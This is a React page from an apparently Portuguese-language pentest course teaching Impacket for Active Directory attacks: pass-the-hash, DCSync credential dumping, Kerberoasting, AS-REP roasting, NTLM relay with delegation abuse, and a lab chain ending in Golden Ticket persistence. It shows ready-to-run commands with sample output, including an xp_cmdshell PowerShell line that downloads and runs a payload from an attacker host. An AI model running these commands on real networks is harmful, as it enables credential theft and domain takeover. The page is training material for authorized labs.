import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Impacket() {
  return (
    <PageContainer
      title="Impacket — toolkit Python para Windows/AD"
      subtitle="psexec, smbexec, secretsdump, GetUserSPNs, ntlmrelayx, mssqlclient — o canivete do AD pentest."
      difficulty="intermediario"
      timeToRead="18 min"
    >
      <h2>Setup</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y python3-impacket",
            out: "(também: pip install impacket — versão mais nova)",
            outType: "muted",
          },
          {
            cmd: "ls /usr/bin/impacket-* | head -10",
            out: `/usr/bin/impacket-GetADUsers
/usr/bin/impacket-GetNPUsers
/usr/bin/impacket-GetUserSPNs
/usr/bin/impacket-mssqlclient
/usr/bin/impacket-mssqlinstance
/usr/bin/impacket-ntlmrelayx
/usr/bin/impacket-psexec
/usr/bin/impacket-secretsdump
/usr/bin/impacket-smbclient
/usr/bin/impacket-smbexec`,
            outType: "info",
          },
        ]}
      />

      <CommandTable
        title="Os 10 scripts mais usados"
        variations={[
          { cmd: "psexec.py", desc: "Shell SYSTEM em Windows via SMB (precisa admin local).", output: "Como sysinternals psexec, mas Linux." },
          { cmd: "smbexec.py", desc: "Shell semi-interativa, mais furtiva que psexec.", output: "Não cria service permanente." },
          { cmd: "wmiexec.py", desc: "Comando via WMI (não toca SMB shares).", output: "Mais furtivo." },
          { cmd: "atexec.py", desc: "Comando via Task Scheduler.", output: "Funciona quando WMI está bloqueado." },
          { cmd: "secretsdump.py", desc: "Dump SAM, LSA, NTDS.dit (TODO o AD).", output: "DCSync remoto." },
          { cmd: "GetUserSPNs.py", desc: "Lista contas com SPN + Kerberoasting.", output: "Output direto para hashcat -m 13100." },
          { cmd: "GetNPUsers.py", desc: "AS-REP roasting (contas sem preauth).", output: "Output para hashcat -m 18200." },
          { cmd: "ntlmrelayx.py", desc: "Relay NTLM contra LDAP/SMB/HTTP.", output: "Captura NTLMv2 e usa em outro alvo." },
          { cmd: "smbclient.py", desc: "smbclient com Pass-the-Hash nativo.", output: "Sem precisar mexer no /etc/krb5.conf." },
          { cmd: "mssqlclient.py", desc: "Cliente MSSQL com auth Windows + Kerb.", output: "Pra explorar SQL como SA." },
          { cmd: "smbserver.py", desc: "SMB server fake para receber arquivos.", output: "Útil em PrivEsc Linux→Win." },
          { cmd: "ticketer.py", desc: "Forja Golden/Silver Ticket.", output: "Persistência total no domínio." },
        ]}
      />

      <h2>Sintaxe de credenciais</h2>
      <OutputBlock label="formato comum: DOMAIN/user:password@host" type="muted">
{`# Senha
domain.local/user:'Senha@123'@10.10.10.5

# NT hash (Pass-the-Hash)
-hashes :ntlmhash
-hashes lmhash:ntlmhash

# Kerberos ticket (.ccache)
export KRB5CCNAME=/tmp/wallyson.ccache
script.py -k -no-pass user@host

# AES key
-aesKey AES256-or-128-key`}
      </OutputBlock>

      <h2>psexec.py — shell SYSTEM</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "impacket-psexec acme.local/wallyson:'Senha@123'@10.10.10.5",
            out: `Impacket v0.12.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.5.....
[*] Found writable share ADMIN$
[*] Uploading file rkrZUgoX.exe
[*] Opening SVCManager on 10.10.10.5.....
[*] Creating service uECY on 10.10.10.5.....
[*] Starting service uECY.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\\Windows\\system32>whoami
nt authority\\system

C:\\Windows\\system32>hostname
SRV-FILESHARE01`,
            outType: "success",
          },
          {
            comment: "Pass-the-hash (sem precisar saber a senha em texto)",
            cmd: "impacket-psexec -hashes :c1e07adc59f6c3eaa7a02e7a4e5f5cc1 acme.local/admin@10.10.10.5",
            out: "(igual mas sem digitar senha)",
            outType: "warning",
          },
        ]}
      />

      <h2>secretsdump.py — DCSync</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "dump LOCAL (precisa admin local)",
            cmd: "impacket-secretsdump acme.local/admin:'Senha@123'@10.10.10.5",
            out: `Impacket v0.12.0

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x782ed7a9b8e1f4a23c45891fde2b3bd1
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c1e07adc59f6c3eaa7a02e7a4e5f5cc1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:599e9d87e0e94042e527ec80a324c43c:::

[*] Dumping cached domain logon information (domain/username:hash)
ACME.LOCAL/wallyson:$DCC2$10240#wallyson#a82b3c4d5e6f7e8f9a0b1c2d3e4f5a6b
ACME.LOCAL/jsmith:$DCC2$10240#jsmith#fedcba0987654321...

[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
ACME\\SRV-FILESHARE01$:plain_password_hex:7e8f9a0b1c2d3e4f5a6b7c8d9e0f...
ACME\\SRV-FILESHARE01$:aad3b435b51404eeaad3b435b51404ee:5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b:::

[*] Cleaning up...`,
            outType: "warning",
          },
          {
            comment: "DCSync (REPLICA TODO O AD a partir do DC)",
            cmd: "impacket-secretsdump 'acme.local/admin:Senha@123@dc01.acme.local' -just-dc",
            out: `[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

ACME\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:c1e07adc59f6c3eaa7a02e7a4e5f5cc1:::
ACME\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e3a17a13ec8d6c5ed5d8b2f5e6ad9e1f:::    ← chave Master, Golden Ticket!
ACME\\jsmith:1108:aad3b435b51404eeaad3b435b51404ee:88846f7eaee8fb117ad06bdd830b7586:::
ACME\\msantos:1109:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
ACME\\svc_backup:1110:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
[...]
[*] Dumping cached domain logon information (domain/username:hash)
[*] Cleaning up...`,
            outType: "error",
          },
        ]}
      />

      <h2>GetUserSPNs.py — Kerberoasting</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "impacket-GetUserSPNs acme.local/wallyson:'Senha@123' -dc-ip 10.10.10.5 -request -outputfile spns.txt",
            out: `Impacket v0.12.0

ServicePrincipalName               Name           MemberOf                                       PasswordLastSet            LastLogon
---------------------------------- -------------  ---------------------------------------------- -------------------------- --------------------
HTTP/intranet.acme.local           svc_intranet                                                 2023-08-12 14:23:11.123456  2026-04-03 11:23:01
MSSQLSvc/sql01.acme.local:1433     svc_sql        CN=Domain Admins,CN=Users,DC=acme,DC=local    2022-11-04 18:42:01.000000  2026-04-03 12:01:14
HOST/srv-iis01                     svc_iis                                                       2024-01-20 09:14:23.000000  2026-04-03 13:42:22

[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_intranet$ACME.LOCAL$HTTP/intranet.acme.local*$84a2c0f4e5d6...$8c6f4a3d7e9c1b5f2a8c6f4a3d7e9c1b1234567890abcdef...
$krb5tgs$23$*svc_sql$ACME.LOCAL$MSSQLSvc/sql01.acme.local~1433*$92b4d1g5f6e7...$1234567890abcdef8c6f4a3d7e9c1b5f2a8c6f4a3d7e9c1b...
$krb5tgs$23$*svc_iis$ACME.LOCAL$HOST/srv-iis01*$73c1e0f3d4c5...$2345678901bcdef08c6f4a3d7e9c1b5f2a8c6f4a3d7e9c1b...`,
            outType: "warning",
          },
          {
            cmd: "hashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt",
            out: `Status...........: Cracked
$krb5tgs$23$*svc_sql$ACME.LOCAL$MSSQLSvc/sql01.acme.local~1433*...:Senha@SQL2024
$krb5tgs$23$*svc_iis$ACME.LOCAL$HOST/srv-iis01*...:IISp@ssword!`,
            outType: "error",
          },
          {
            comment: "svc_sql é Domain Admin = comprometemos o domínio inteiro",
            cmd: "impacket-secretsdump 'acme.local/svc_sql:Senha@SQL2024@dc01.acme.local' -just-dc-user krbtgt",
            out: `ACME\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e3a17a13ec8d6c5ed5d8b2f5e6ad9e1f:::`,
            outType: "error",
          },
        ]}
      />

      <h2>GetNPUsers.py — AS-REP roasting</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "contas com 'Do not require Kerberos preauth' aceitam AS-REQ sem creds",
            cmd: "impacket-GetNPUsers acme.local/ -no-pass -dc-ip 10.10.10.5 -usersfile users.txt -format hashcat -outputfile asrep.txt",
            out: `Impacket v0.12.0

[!] User maria@acme.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[!] User jsmith@acme.local doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$wallyson@ACME.LOCAL:abc123def456...$789xyz...
[!] User admin@acme.local doesn't have UF_DONT_REQUIRE_PREAUTH set`,
            outType: "warning",
          },
          {
            cmd: "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt",
            out: `$krb5asrep$23$wallyson@ACME.LOCAL:abc123...:Senha@123`,
            outType: "success",
          },
        ]}
      />

      <h2>ntlmrelayx.py — relay NTLM</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "configurar relay para LDAPS (cria conta de computador → privesc)",
            cmd: "impacket-ntlmrelayx -t ldaps://dc01.acme.local --delegate-access --no-smb-server",
            out: `Impacket v0.12.0

[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Servers started, waiting for connections

(em outra session: forçar uma vítima a autenticar — ex: PetitPotam, PrinterBug)
[*] HTTPD: Received connection from 10.10.10.50, attacking target ldaps://dc01.acme.local
[*] HTTPD: Client requested path: /
[*] HTTPD: Client did NOT send NTLM authentication
[*] HTTPD: Client requested path: /
[*] HTTPD: Sending NTLM challenge
[*] Authenticating against ldaps://dc01.acme.local as ACME/SRV-FILESHARE01$ SUCCEED

[*] Domain admins group SID: S-1-5-21-...-512
[*] Adding new computer with username: KZS90M$ and password: ZxC1mn?... result: OK
[*] Delegation rights modified successfully!
[*] KZS90M$ can now impersonate users on SRV-FILESHARE01$ via S4U2Proxy

[*] DOMAIN ADMINS: Administrator, jsmith, msantos
[*] All users dumped to lootloot/`,
            outType: "error",
          },
          {
            comment: "agora você tem RBCD — pode pedir tickets como qualquer user",
            cmd: "impacket-getST -spn cifs/SRV-FILESHARE01.acme.local -impersonate Administrator 'acme.local/KZS90M$:ZxC1mn?...' -dc-ip 10.10.10.5",
            out: "(devolve ticket de Administrator para o serviço cifs em SRV-FILESHARE01)",
            outType: "warning",
          },
        ]}
      />

      <h2>mssqlclient.py — pwning MSSQL</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "impacket-mssqlclient ACME/svc_sql:'Senha@SQL2024'@10.10.10.50 -windows-auth",
            out: `Impacket v0.12.0

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01): Line 1: Changed database context to 'master'.
[*] INFO(SQL01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (170) - 15.00.2080
[!] Press help for extra shell commands
SQL (ACME\\svc_sql  guest@master)>`,
            outType: "info",
          },
        ]}
      />
      <Terminal
        user="SQL"
        host="ACME\\svc_sql"
        path="master"
        lines={[
          {
            cmd: "enable_xp_cmdshell",
            out: `[*] INFO(SQL01): Line 185: Configuration option 'show advanced options' changed from 0 to 1.
[*] INFO(SQL01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1.`,
            outType: "warning",
          },
          {
            cmd: "xp_cmdshell whoami",
            out: `output                                  
--------------------------------------- 
nt service\\mssqlserver`,
            outType: "info",
          },
          {
            comment: "se o serviço MSSQL roda como Domain Admin → você é DA",
            cmd: "xp_cmdshell powershell -c \"$cred = New-Object Net.WebClient; $cred.DownloadFile('http://10.10.14.42/p.exe', 'C:\\Temp\\p.exe'); Start-Process C:\\Temp\\p.exe\"",
            out: "(baixa e executa payload)",
            outType: "error",
          },
        ]}
      />

      <h2>smbclient.py com PtH</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "impacket-smbclient -hashes :c1e07adc59f6c3eaa7a02e7a4e5f5cc1 acme.local/admin@10.10.10.5",
            out: `Impacket v0.12.0

Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
SYSVOL
Backup
Public
# use Backup
# ls
drw-rw-rw-          0  Mon Mar 11 18:23  .
drw-rw-rw-          0  Mon Mar 11 18:23  ..
-rw-rw-rw-     412847  Tue Mar 12 09:11  backup_2024.zip
-rw-rw-rw-     245631  Wed Mar 13 14:23  ntds_backup.dit
# get ntds_backup.dit
# exit`,
            outType: "warning",
          },
        ]}
      />

      <PracticeBox
        title="Mini-pwn AD em laboratório"
        goal="Sequência: shell user → secretsdump → kerberoast → DCSync."
        steps={[
          "Tendo creds de um user comum: rode GetUserSPNs.",
          "Cracke os hashes obtidos.",
          "Se algum quebrar e for high priv: rode secretsdump -just-dc.",
          "Use o hash do krbtgt para Golden Ticket (próxima fase)",
        ]}
        command={`USER='wallyson'
PASS='Senha@123'
DC='10.10.10.5'

# 1) kerberoasting
impacket-GetUserSPNs acme.local/$USER:$PASS -dc-ip $DC -request -outputfile spns.txt

# 2) crack
hashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt

# 3) com DA cracked: DCSync
impacket-secretsdump 'acme.local/svc_sql:CRACKED_PWD@'$DC -just-dc -outputfile dump

# 4) Golden Ticket (próximo passo)
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <domain-sid> -domain acme.local administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass -dc-ip $DC acme.local/administrator@dc01.acme.local`}
        expected={`(GetUserSPNs) → 3 SPNs encontrados
(hashcat) → 1 senha quebrada (svc_sql)
(secretsdump) → 412 contas dumped, incluindo krbtgt
(ticketer) → administrator.ccache forjado
(psexec) → shell SYSTEM no DC`}
        verify="Após sequência completa, você tem PERSISTENT access no domínio (Golden Ticket dura 10 anos por padrão)."
      />

      <AlertBox type="danger" title="Golden Ticket = persistência absoluta">
        Com o hash do krbtgt você forja TGTs para QUALQUER usuário, com QUALQUER permissão,
        por até 10 anos. Para revogar: rotacionar o krbtgt password DUAS VEZES (não basta uma).
        Detecção: Event ID 4769 com TGT lifetime anormal, account em SAM.
      </AlertBox>
    </PageContainer>
  );
}
